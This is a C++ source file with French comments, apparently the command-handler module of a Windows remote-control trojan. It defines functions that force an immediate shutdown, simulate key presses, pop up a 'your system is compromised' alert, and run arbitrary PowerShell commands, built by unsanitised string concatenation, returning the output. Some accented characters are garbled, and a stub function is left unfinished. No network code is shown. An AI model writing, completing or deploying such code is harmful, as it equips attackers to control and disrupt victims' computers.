#include <windows.h>
#include <wininet.h>
#include <shlobj.h>
#include <cstdlib>
#include <tchar.h>
#include <thread>
#include <vector>
#include <chrono>
#include <string>
#include <fstream>
#include <iostream>
#include "../include/core.h"
#include "../include/command.h"

using namespace std;

#pragma comment(lib, "wininet.lib")

// =============================================================
// Fonction relatives au commandes �x�cutables par le main
// =============================================================

/*
string parseCommand(const string& input, string& command, string& argument) {
	int pos;

	pos = (input.find_first_of(' '));

	argument = 
}
*/

// Fonction pour �teindre l'ordinateur
void shtd() {
    system("shutdown /s /t 0");
}

// Fonction pour �ffectuer un WIN + D
void wind() {
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event('D', 0, 0, 0);
    keybd_event('D', 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
}

// Affiche une bo�te de dialogue d'alerte.
void ShowMessage() {
    MessageBox(NULL, TEXT("Votre syst�me est compromis !"), TEXT("Alerte"), MB_OK);
}

// Execute une commande PowerShell et retourne le r�sultat.
string ExecuteShellCommand(const string& command) {
    // Redirige la sortie vers un fichier temporaire
    string tempFile = "std-cmd-output.txt";
    string fullCommand = "powershell -Command \"" + command + "\" > " + tempFile;
    
    // Exécute la commande
    system(fullCommand.c_str());
    
    // Lit le contenu du fichier
    FILE* file = fopen(tempFile.c_str(), "r");
    if (!file) {
        return "Erreur: impossible de lire le résultat";
    }
    
    // Lit le fichier et stocke le contenu
    char buffer[1024];
    string result;
    while (fgets(buffer, sizeof(buffer), file) != nullptr) {
        result += buffer;
    }
    
    fclose(file);
    
    // Supprime le fichier temporaire
    remove(tempFile.c_str());
    
    return result;
}